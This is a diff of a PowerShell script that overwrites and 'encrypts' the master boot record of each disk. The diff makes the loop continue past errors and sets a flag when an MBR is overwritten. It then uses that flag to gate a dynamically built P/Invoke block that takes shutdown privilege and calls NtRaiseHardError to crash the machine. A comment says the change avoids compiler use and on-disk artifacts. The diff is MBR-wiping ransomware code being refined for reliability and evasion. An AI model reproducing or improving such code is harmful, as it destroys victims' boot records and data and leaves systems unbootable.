@@ -32,11 +32,13 @@ foreach ($drive in $drives) {
         # Write the modified MBR back to the disk
         $fs.Seek(0, [IO.SeekOrigin]::Begin) | Out-Null
         $fs.Write($mbr, 0, 512)
-
+        
+        $mbrOverwritten = $true
         Write-Host "`nSuccessfully encrypted MBR on $diskPath"
 
     } catch {
-        throw "Failed to process $diskPath - $_"
+        Write-Host "`nFailed to process $diskPath - $_"
+        
     } finally {
         # Close the file stream
         if ($fs) { $fs.Dispose() }
@@ -44,20 +46,23 @@ foreach ($drive in $drives) {
 }
 
 # Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and prevent on-disk artifacts
-$asmName = New-Object Reflection.AssemblyName "PInvoke"
-$asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-$mod = $asm.DefineDynamicModule("DynamicModule")
-$type = $mod.DefineType("NativeMethods")
+if ($mbrOverwritten) {
 
-function Add-PInvoke {
-    param($DllName, $Name, $ParameterTypes, $ReturnType)
-    $mb = $type.DefinePInvokeMethod($Name, $DllName, 'Public,Static,PinvokeImpl', 'Standard', $ReturnType, $ParameterTypes, 'Winapi', 'Auto')
-    $mb.SetImplementationFlags('PreserveSig')
+    $asmName = New-Object Reflection.AssemblyName "PInvoke"
+    $asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $mod = $asm.DefineDynamicModule("DynamicModule")
+    $type = $mod.DefineType("NativeMethods")
+
+    function Add-PInvoke {
+        param($DllName, $Name, $ParameterTypes, $ReturnType)
+        $mb = $type.DefinePInvokeMethod($Name, $DllName, 'Public,Static,PinvokeImpl', 'Standard', $ReturnType, $ParameterTypes, 'Winapi', 'Auto')
+        $mb.SetImplementationFlags('PreserveSig')
+    }
+
+    Add-PInvoke -DllName ntdll -Name RtlAdjustPrivilege -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
+    Add-PInvoke -DllName ntdll -Name NtRaiseHardError -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
+
+    $NM = $type.CreateType()
+    $NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
+    $NM::NtRaiseHardError(3221225506, 0, 0, [IntPtr]::Zero, 6, [ref]0)
 }
-
-Add-PInvoke -DllName ntdll -Name RtlAdjustPrivilege -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
-Add-PInvoke -DllName ntdll -Name NtRaiseHardError -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
-
-$NM = $type.CreateType()
-$NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
-$NM::NtRaiseHardError(3221225506, 0, 0, [IntPtr]::Zero, 6, [ref]0)
